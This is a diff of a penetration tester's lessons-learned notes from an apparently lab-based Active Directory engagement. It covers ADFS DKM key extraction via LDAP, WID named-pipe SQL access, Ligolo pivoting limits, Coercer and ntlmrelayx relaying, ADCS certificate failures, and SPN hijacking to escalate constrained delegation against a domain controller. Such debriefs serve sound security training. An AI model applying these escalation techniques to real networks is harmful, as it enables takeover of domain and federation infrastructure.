-**WID named pipe connection** — `np:\\.\pipe\microsoft##wid\tsql\query` for SQL connections to ADFS config. The ADFS service account gets `db_owner` via the `db_genevaservice` role. TRUSTWORTHY is off and xp_cmdshell is disabled — no RCE from WID, but full ADFS config CRUD is available.
+**ADFS DKM keys live in LDAP**: The DKM container under `CN=Microsoft,CN=Program Data` holds key material in `thumbnailPhoto` on contact objects. Readable by the ADFS service account. ADFSpoof needs minor patching for modern `cryptography` library — remove deprecated `@utils.register_interface`, fix `utils._check_bytes()` and `utils.int_to_bytes()`, drop `backend=` from HMAC constructor.
 
-**Test VPN reachability before building tunnel infrastructure** — Three sessions were spent on complex Ligolo ARP workarounds. A single PowerShell TCP test from WEB01 would have revealed that Kali's VPN IP was directly reachable. Always run `(New-Object Net.Sockets.TcpClient).ConnectAsync("<VPN_IP>", 445).Wait(3000)` from a new pivot before investing in elaborate forwarding chains.
+**WID named pipe auth**: Connect to WID via `np:\\.\pipe\microsoft##wid\tsql\query`. The ADFS service account gets `db_owner` via `db_genevaservice` role. But `TRUSTWORTHY=False` and no sysadmin means no `xp_cmdshell` — it's a SQL extraction path, not a code execution path.
 
-**Ligolo TUN ARP limitation** — `ip addr add 192.168.100.50/24 dev ligolo` puts an IP on Kali's TUN interface but the agent does NOT respond to ARP for that IP on the remote network. Hosts in the same /24 as the agent ARP locally and get no reply. This only works if the pivot host has proxy-ARP enabled or a secondary IP added — neither of which applies here.
+**ADFS returns 503 externally, works from localhost**: HTTP.sys drops connections externally when no listener is registered on 80/443. From WEB01 itself, `https://localhost/adfs/ls/` renders fine. Always check service accessibility from the service host itself, not just from outside.
 
-**Windows SO_EXCLUSIVEADDRUSE port binding** — SMB (445), HTTP.sys (80/443), LDAP, Kerberos, kpasswd all use exclusive socket binding. DNS (53), MSRPC (135), and NetBIOS (139) allow dual binding. Ligolo `listener_add` can only coexist on the latter group, and even then the most-specific binding wins (a service bound to `192.168.100.1:139` beats ligolo's `0.0.0.0:139` for connections to that IP).
+**Test VPN IP reachability before building tunnel infrastructure**: Three sessions spent on `ip addr add 192.168.100.50/24 dev ligolo` (which fails because the ligolo agent doesn't respond to ARP on the remote network). The actual solution: WEB01 could reach Kali's VPN IP directly through DC01's routing. A 5-second TCP test from the target would have saved hours.
 
-**ADCS ESC1 with wrong EKU** — A certificate issued with Server Authentication EKU only is useless for PKINIT and Schannel LDAP identity mapping, regardless of what UPN it contains. Windows checks the Application Policies extension before EKU; a broken `0.0` OID (produced by certipy `-application-policies` against schema v2 templates) fails all checks. Schema v2 templates ignore Application Policy overrides in the CSR.
+**Ligolo TUN ARP limitation**: `ip addr add <internal-IP>/24 dev ligolo` puts a virtual IP on your TUN interface, but the agent does *not* ARP-proxy for it on the remote network. This approach only works if the pivot host has proxy ARP enabled, or you add a secondary IP to the pivot host's interface (which requires admin). For same-subnet targets, use the pivot host's real IP or route via gateway.
 
-**SPN hijacking for constrained delegation escalation** — When an account has KCD to a specific SPN plus WriteSPN on a higher-value target: remove that SPN from its current owner, add it to the target, then S4U2Proxy with `-altservice` to rewrite the ticket's service name. The KDC encrypts the ticket with whichever account owns the SPN at time of issuance — moving the SPN changes the encryption key.
+**Windows SO_EXCLUSIVEADDRUSE**: SMB (445), HTTP.sys (80/443), Kerberos (88), kpasswd (464), LDAP (389/636) all use exclusive binding. You cannot dual-bind these with ligolo's `listener_add`. DNS (53), MSRPC (135), and NetBIOS (139) allow wildcard+specific coexistence — but the specific binding (e.g. `192.168.100.1:139`) wins for traffic to that IP. Plan your relay port selection around this.
 
-**Coercer venv isolation** — `pip install coercer` pulls impacket 0.10.0, which conflicts with system impacket 0.14.0 at import time. Always run `python3 -m venv env && pip install coercer` and keep ntlmrelayx on the system install.
+**`ERROR_BAD_NETPATH` from Coercer**: This means the target *tried* to connect but couldn't reach the listener — not that the coercion RPC call failed. Don't assume authentication was sent. Verify by watching ntlmrelayx for incoming connections. This distinction cost me time.
 
-**ntlmrelayx needs a controlling terminal** — Background `nohup` invocations die silently. Use `tmux new-session -d -s relay 'sudo impacket-ntlmrelayx ...'` to keep it alive. Same applies to chisel and ligolo agents: keep them in blocking WinRM sessions or tmux panes.
+**Coercer venv isolation**: `pip install coercer` pulls impacket 0.10.0 which breaks system impacket 0.14.0 (`parse_identity` import error). Always isolate coercer in a venv: `python3 -m venv env && source env/bin/activate && pip install coercer`. Run coercer from the venv, ntlmrelayx from the system impacket.
+
+**ntlmrelayx needs a terminal**: Background `sudo nohup ntlmrelayx &` dies silently. Use `tmux new-session -d -s relay 'sudo impacket-ntlmrelayx ...'` so it stays alive with a controlling terminal.
+
+**PassTheCert + broken Application Policies**: Windows evaluates the Microsoft Application Policies extension *before* EKU. If certipy's `-application-policies` flag produces a broken `0.0` OID (happens on schema v2 templates where CA ignores CSR policy extensions), Schannel identity mapping fails — regardless of what's in the EKU field. Both `a.white.pfx` and the attempted ESC15 cert were unusable for PKINIT or Schannel LDAP auth for this reason.
+
+**SPN hijacking for constrained delegation escalation**: When you have WriteSPN on a higher-value target (DC01$) and constrained delegation to a lower-value service (HTTP/WEB01): remove the target SPN from the service computer, add it to the high-value computer, run S4U with `-altservice` to rewrite the ticket's service name. The KDC encrypts the ticket with whoever *owns* the SPN at delegation time — move the SPN, change whose key is used.
+
+**Delegate specialist research earlier**: Four sessions of manual ADFS exploitation (WCF certificatemixed, jwt-bearer OBO, silver tickets, theme injection, C2WTS) could have been shortcut by asking "what tool handles non-admin WinRM + interactively logged-in user?" The answer — RemotePotato0 — was immediately surfaced by the exploit researcher. The actual solution (coerce via VPN IP) bypassed RemotePotato0 entirely, but the lesson stands: identify the right tool category before exhausting wrong approaches.
